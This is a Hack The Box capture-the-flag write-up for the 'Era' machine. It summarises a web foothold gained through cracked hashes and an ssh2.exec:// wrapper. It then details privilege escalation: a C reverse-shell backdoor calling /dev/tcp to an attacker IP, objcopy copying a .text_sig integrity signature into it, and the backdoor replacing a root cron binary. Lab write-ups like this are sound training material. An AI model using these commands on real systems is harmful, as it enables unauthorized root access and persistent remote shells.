## Overview
Era is a medium-difficulty machine from Hack The Box that starts with enumerating a web application and discovering a hidden subdomain, `file.era.htb`. After registering an account and uploading files, we obtain a site backup ZIP containing a SQLite database. Dumping the database reveals password hashes, two of which we successfully crack. Using one set of credentials, we log in and set security questions for the admin account, then log in as admin. With admin access, we exploit a custom file download endpoint that accepts an `ssh2.exec://` wrapper, allowing us to execute a reverse shell on the target. After gaining a foothold, we discover a cron‑job that runs a binary with a custom `.text_sig` section for integrity verification. By injecting that signature into a malicious backdoor and replacing the original binary, we achieve root access.

## Privilege Escalation
After gaining a foothold as `eric`, I performed local enumeration and discovered a custom antivirus (AV) system located in `/opt/AV/`. The directory contained a critical binary:  
`/opt/AV/periodic-checks/monitor`.

This binary is executed periodically by a cron job as **root**. It includes a custom section `.text_sig` used for integrity verification.

Backdoor Creation
I crafted a simple C reverse shell and compiled it statically to avoid library dependencies:

```bash
printf '#include <stdlib.h>\nint main() {\n    system("/bin/bash -c '\''bash -i >& /dev/tcp/10.10.16.154/4444 0>&1'\''");\n    return 0;\n}\n' > /tmp/backdoor.c

gcc -static -o /tmp/monitor_backdoor /tmp/backdoor.c
```
Extracting the Integrity Signature
I dumped the .text_sig section from the legitimate monitor binary:

```bash
objcopy --dump-section .text_sig=/tmp/sig /opt/AV/periodic-checks/monitor
```
Injecting the Signature
I added the extracted section to my backdoor:

```bash
objcopy --add-section .text_sig=/tmp/sig /tmp/monitor_backdoor
Now the backdoor contained the same signature as the original, bypassing the integrity check.
```
Replacing the Binary
```bash
cp /tmp/monitor_backdoor /opt/AV/periodic-checks/monitor
chmod +x /opt/AV/periodic-checks/monitor
```
Gaining Root
I started a listener on my machine:

```bash
nc -nvlp 4444
Within 1–2 minutes, the cron job executed the backdoor as root, and I received a fully privileged reverse shell.
```
